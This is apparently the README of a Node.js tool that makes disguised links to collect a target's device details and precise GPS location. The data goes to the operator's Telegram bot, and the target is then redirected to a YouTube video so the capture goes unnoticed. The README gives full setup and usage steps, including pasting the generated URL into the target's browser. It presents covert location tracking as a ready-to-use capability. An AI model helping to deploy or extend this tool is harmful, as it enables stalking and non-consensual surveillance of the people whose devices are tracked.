# DESCRIPTION
This program let you gather the Possible Information about the target Device and also the Current Location (Accurate with GPS Hardware) and these Collected Informations can be accessed via Telegram

# Note
  1. It needs to be hosted on Https to make it completely working

 # CONFIGURING .env
  1. Create a Telegram account
  2. Create Telegram bot using Botfather
  3. copy BOT_TOKEN from telegram bot father to .env > TOKEN
  4. paste the desired 'sha256' password to .env > PASSWORD
  5. host the server with a domain (HTTPS for accessing location) and copy the main url to .env > URL
  6. paste the desired port number to .env > PORT

# INSTALLATION
 1. run : npm install
 2. configure .env
 3. run : node index.js

# RUN
  1. Run the server
  2. Open the Created Bot in telegram
  3. Enter the password (Unhashed) into input
  4. Once Authenticated , use help to view instructions
  5. create url
  6. paste the url into target browser
  7. the gathered information will be sent to the telegram bot

# HELP
  1. url - gets a normal url which will redirect to a default youtube video once information is gathered and sent
  2. url [youtube id] -  gets a url which redirects to the youtube video with the youtube id: eg:-url oKWoY1hFD7o
  3. ping - to check if you are Authenticated
  4. help - to show Help Menu
